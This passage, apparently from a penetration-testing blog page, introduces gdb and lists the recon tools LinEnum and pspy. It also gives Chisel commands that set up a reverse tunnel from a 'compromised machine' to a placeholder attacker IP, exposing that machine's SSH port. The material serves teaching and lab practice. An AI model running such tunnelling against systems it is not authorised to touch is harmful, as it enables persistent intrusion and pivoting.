+<p><strong>Gdb (GNU Debugger) is a powerful tool for debugging programs. It allows you to analyze the execution of a binary in real time, inspect memory, modify registers, or even exploit vulnerabilities such as buffer overflows.</strong></p>
+
+
+
+
+
+<div class="tabs tabs-code tabs-left">
+  
+
+
+
+
+<style>
+  .tabs input#tab-10-0:checked ~ .tab-content-10-0 {
+    display: block;
+  }
+</style>
+
+<input type="radio" class="tab-input" name="tab-select-10" id="tab-10-0" checked/>
+<label for="tab-10-0" class="tab-label">Bash</label>
+<div class="tab-content tab-content-10-0">
+  <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>gdb ./programa
+</span></span></code></pre></div>
+</div>
+
+
+
+
+</div>
+
+
+
+<p><strong>With this, you enter the interactive environment of gdb, where you can define breakpoints, analyze the flow of the program and exploit vulnerabilities.</strong></p>
+<h1 id="task-automation">
+  Task automation
+  <a class="heading-link" href="#task-automation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<h2 id="lineumhttpsgithubcomrebootuserlinenum">
+  <a href="https://github.com/rebootuser/LinEnum"  class="external-link" target="_blank" rel="noopener">LinEum</a>
+  <a class="heading-link" href="#lineumhttpsgithubcomrebootuserlinenum">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p><strong>LinEnum is a script that automates the collection of information from Linux systems to identify possible privilege escalation vectors. It checks permissions, sensitive files, SUID binaries, crontabs and more, saving time on manual audits.</strong></p>
+<h2 id="pspyhttpsgithubcomdominicbreukerpspy">
+  <a href="https://github.com/DominicBreuker/pspy"  class="external-link" target="_blank" rel="noopener">PSPY</a>
+  <a class="heading-link" href="#pspyhttpsgithubcomdominicbreukerpspy">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p><strong>Pspy is a lightweight tool that monitors processes running on the system without requiring elevated permissions. It is useful for identifying scripts, cron tasks, or running services that can be exploited.</strong></p>
+<h2 id="chiselhttpsgithubcomjpillorachisel">
+  <a href="https://github.com/jpillora/chisel"  class="external-link" target="_blank" rel="noopener">Chisel</a>
+  <a class="heading-link" href="#chiselhttpsgithubcomjpillorachisel">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p><strong>Chisel is a reverse tunneling and port forwarding tool. It is useful for establishing connections between compromised machines and the attacker, especially in environments where network access is restricted.</strong></p>
+<p><strong>Example usage:</strong></p>
+<p><em>On the attacker (server mode):</em></p>
+
+
+
+
+
+<div class="tabs tabs-code tabs-left">
+  
+
+
+
+
+<style>
+  .tabs input#tab-11-0:checked ~ .tab-content-11-0 {
+    display: block;
+  }
+</style>
+
+<input type="radio" class="tab-input" name="tab-select-11" id="tab-11-0" checked/>
+<label for="tab-11-0" class="tab-label">Bash</label>
+<div class="tab-content tab-content-11-0">
+  <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>chisel server -p <span style="color:#3677a9">8000</span> --reverse
+</span></span></code></pre></div>
+</div>
+
+
+
+
+</div>
+
+
+
+<p><em>On the compromised machine (client mode):</em></p>
+
+
+
+
+
+<div class="tabs tabs-code tabs-left">
+  
+
+
+
+
+<style>
+  .tabs input#tab-12-0:checked ~ .tab-content-12-0 {
+    display: block;
+  }
+</style>
+
+<input type="radio" class="tab-input" name="tab-select-12" id="tab-12-0" checked/>
+<label for="tab-12-0" class="tab-label">Bash</label>
+<div class="tab-content tab-content-12-0">
+  <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>chisel client ip <span style="color:#6ab825;font-weight:bold">do</span> atacante:8000 R:8000:localhost:22
+</span></span></code></pre></div>
+</div>
+
+
+
+
+</div>
+
+
+
+<p><strong>This command redirects port 22 (usually SSH) of the compromised machine to the attacker!</strong></p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css"
+    integrity="sha384-vKruj+a13U8yHIkAyGgK1J3ArTLzrFGBbBc0tDp4ad/EyewESeXE/Iv67Aj8gKZ0" crossorigin="anonymous">
+  
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.js"
+    integrity="sha384-PwRUT/YqbnEjkZO0zZxNqcxACrXe+j766U2amXcgMg5457rve2Y7I6ZJSm2A0mS4" crossorigin="anonymous"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/contrib/auto-render.min.js"
+    integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous"
+    onload="renderMathInElement(document.body,
+      {
+        delimiters: [
+          {left: '$$', right: '$$', display:true},
+          {left: '$', right: '$', display:false},
+          {left: '\\(', right: '\\)', display: false},
+          {left: '\\[', right: '\\]', display: true}
+        ]
+      }
+    );"></script>
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+    2025
+     pwnbuffer 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder (modified)</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="https://pwnbuffer.org/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+  
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
